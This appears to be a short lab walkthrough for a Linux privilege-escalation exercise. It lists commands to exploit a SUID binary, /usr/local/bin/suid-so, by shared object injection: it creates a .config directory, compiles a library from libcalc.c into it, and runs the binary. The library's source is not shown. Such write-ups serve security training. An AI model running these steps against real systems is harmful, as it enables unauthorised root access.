1. The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
2. First create a .config directory.
```console
mkdir /home/user/.config
```
3. Now inject with shared object c-file.
```console
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```
4. Run the file
```console
/usr/local/bin/suid-so
```